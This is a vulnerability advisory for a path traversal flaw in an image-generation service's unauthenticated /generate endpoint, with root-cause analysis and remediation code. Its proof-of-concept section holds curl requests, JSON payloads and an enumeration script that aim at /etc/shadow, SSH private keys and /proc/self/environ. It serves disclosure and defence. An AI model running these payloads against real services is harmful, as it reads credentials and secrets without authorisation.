# VULN-DF-PY-001: Path Traversal (Arbitrary File Read)

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **ID** | VULN-DF-PY-001 |
| **Type** | Path Traversal (Read) |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **Severity** | High |
| **Confidence** | 85 (CONFIRMED) |
| **Location** | `examples/service/worker.py:140-141` |
| **Function** | `generate()` |
| **Source Module** | examples/service |

## Vulnerability Description

The `image` field from HTTP requests is passed directly to `Image.open()` without any path validation or sanitization. An attacker can exploit this vulnerability to read arbitrary files on the server by using path traversal sequences (`../`) in the `image` parameter.

### Vulnerable Code

```python
# examples/service/worker.py:139-141
if request.image is not None:
    img = Image.open(request.image).convert("RGB")
    logging.info(f"Input image: {request.image}")
```

### Attack Chain

```
HTTP POST /generate → GeneratorRequest(image=...) → worker.py:generate() → Image.open(request.image)
```

## Exploitation Analysis

### Attack Vector

1. **Network Accessible**: The service binds to `0.0.0.0:6000` with **no authentication**
2. **Direct Input**: The `image` field is a Pydantic `Optional[str]` with no validation beyond type checking
3. **No Sanitization**: No path traversal checks, no whitelist, no symlink checks
4. **PIL.Image.open()**: Accepts any path and attempts to read it as an image file

### Exploit Scenarios

#### Scenario 1: Sensitive File Disclosure (Linux)

```http
POST /generate HTTP/1.1
Host: target-server:6000
Content-Type: application/json

{
    "prompt": "test",
    "sample_steps": 40,
    "task": "i2v-A14B",
    "image": "../../../etc/passwd"
}
```

**Result**: The server attempts to open `/etc/passwd` as an image. While PIL may fail to parse it as an image, the file contents may be logged or exposed through error messages.

#### Scenario 2: Credential File Extraction

```json
{
    "image": "/root/.ssh/id_rsa"
}
```

**Result**: Attempts to read SSH private key.

#### Scenario 3: Application Configuration Disclosure

```json
{
    "image": "/data/models/config.json"
}
```

**Result**: Read model configuration files containing sensitive parameters.

#### Scenario 4: Absolute Path Access

```json
{
    "image": "/proc/self/environ"
}
```

**Result**: Read environment variables which may contain secrets (API keys, database credentials).

### Error-Based Information Disclosure

Even when PIL fails to parse non-image files, valuable information can be extracted:

1. **File Existence Validation**: Error message indicates if file exists
2. **Path Enumeration**: Can enumerate directory structure through errors
3. **File Size Leakage**: PIL error messages often include file metadata
4. **Content Leakage**: Error handling may log file contents

### Impact Assessment

| Impact Category | Severity | Description |
|-----------------|----------|-------------|
| **Information Disclosure** | **High** | Arbitrary file read enables extraction of credentials, secrets, and sensitive data |
| **Privilege Escalation** | **Medium** | SSH keys, API tokens can enable further compromise |
| **System Enumeration** | **High** | `/proc/*` filesystem enables detailed system reconnaissance |
| **Business Impact** | **High** | Model weights, proprietary data, customer information at risk |

### Attack Prerequisites

| Requirement | Status |
|-------------|--------|
| Network access to port 6000 | Required (no firewall assumed) |
| Authentication | **NONE** - service is unauthenticated |
| File permissions | Files readable by service process user |
| PIL compatibility | Not required for enumeration attacks |

## Proof of Concept

### Basic Path Traversal Test

```bash
# Test relative path traversal
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"task":"i2v-A14B","image":"../../../etc/passwd"}'

# Test absolute path access
curl -X POST http://target:6000/generate \
  -H "Content-Type: application/json" \
  -d '{"prompt":"test","sample_steps":40,"task":"i2v-A14B","image":"/etc/shadow"}'
```

### Automated Enumeration Script

```python
#!/usr/bin/env python3
import requests
import sys

SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/root/.ssh/id_rsa",
    "/root/.bash_history",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/auth.log",
]

def check_file(target, file_path):
    try:
        r = requests.post(f"{target}/generate", json={
            "prompt": "test",
            "sample_steps": 40,
            "task": "i2v-A14B",
            "image": file_path
        }, timeout=10)
        
        # Check for file existence based on response
        if "cannot identify image file" in r.text:
            print(f"[EXISTS] {file_path}")
        elif "No such file" in r.text:
            print(f"[NOT EXISTS] {file_path}")
        else:
            print(f"[UNKNOWN] {file_path} - {r.status_code}")
    except Exception as e:
        print(f"[ERROR] {file_path} - {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:6000"
    for f in SENSITIVE_FILES:
        check_file(target, f)
```

## Root Cause Analysis

### Why This Vulnerability Exists

1. **Missing Input Validation**: The Pydantic model only validates type (Optional[str]), not content
2. **Direct File API Usage**: `Image.open()` is used directly instead of safe wrappers
3. **Unused Security Controls**: The project has `safe_open()` in `mindiesd/utils/file_utils.py` with symlink checks, path length limits, and permission validation - but it's **not used** in this code path
4. **No Authentication**: The HTTP service has no authentication mechanism

### Comparison with Safe Implementation

**Vulnerable (Current)**:
```python
img = Image.open(request.image).convert("RGB")  # No validation
```

**Safe (Should be)**:
```python
from mindiesd.utils.file_utils import safe_open, standardize_path

# Validate and sanitize path
safe_path = standardize_path(request.image, check_link=True)
img = Image.open(safe_path).convert("RGB")  # Or use safe_open wrapper
```

## Remediation Recommendations

### Priority: P1 (Critical - Immediate Fix)

### 1. Path Validation and Sanitization

```python
# In worker.py - Replace vulnerable code
import os
from pathlib import Path

ALLOWED_IMAGE_DIR = "/data/images"  # Whitelisted directory

def validate_image_path(image_path: str) -> str:
    """Validate image path is within allowed directory."""
    if not image_path:
        raise ValueError("Image path cannot be empty")
    
    # Resolve to absolute path
    abs_path = os.path.realpath(image_path)
    
    # Check against whitelist
    allowed_dir = os.path.realpath(ALLOWED_IMAGE_DIR)
    if not abs_path.startswith(allowed_dir + "/"):
        raise ValueError(f"Image path must be within {ALLOWED_IMAGE_DIR}")
    
    # Check for symlink (use existing safe_open checks)
    if os.path.islink(image_path):
        raise ValueError("Symbolic links are not allowed")
    
    # Validate file extension
    allowed_extensions = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}
    if Path(abs_path).suffix.lower() not in allowed_extensions:
        raise ValueError(f"Invalid image extension: {Path(abs_path).suffix}")
    
    return abs_path

# Usage in generate()
if request.image is not None:
    safe_path = validate_image_path(request.image)
    img = Image.open(safe_path).convert("RGB")
```

### 2. Use Existing Safe File Utilities

```python
from mindiesd.utils.file_utils import standardize_path, check_file_safety

if request.image is not None:
    safe_path = standardize_path(request.image, check_link=True)
    check_file_safety(safe_path, permission_mode=0o640)
    img = Image.open(safe_path).convert("RGB")
```

### 3. Add Authentication

```python
# In server.py - Add authentication middleware
from fastapi import Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

security = HTTPBearer()

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Validate API token."""
    valid_tokens = os.environ.get("API_TOKENS", "").split(",")
    if credentials.credentials not in valid_tokens:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials"
        )
    return credentials

@app.post("/generate")
async def generate_image(
    request: GeneratorRequest,
    _: HTTPAuthorizationCredentials = Depends(verify_token)
):
    # ... existing logic
```

### 4. Network Binding Restriction

```python
# In server.py - Bind to localhost only in production
uvicorn.run(app, host="127.0.0.1", port=6000)  # Instead of 0.0.0.0
```

## Testing Recommendations

1. **Unit Tests**: Add tests for path traversal prevention
2. **Integration Tests**: Verify authentication middleware
3. **Security Scan**: Run automated path traversal tests
4. **Penetration Test**: Comprehensive file disclosure testing

## References

- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PIL Image.open Security Considerations](https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.open)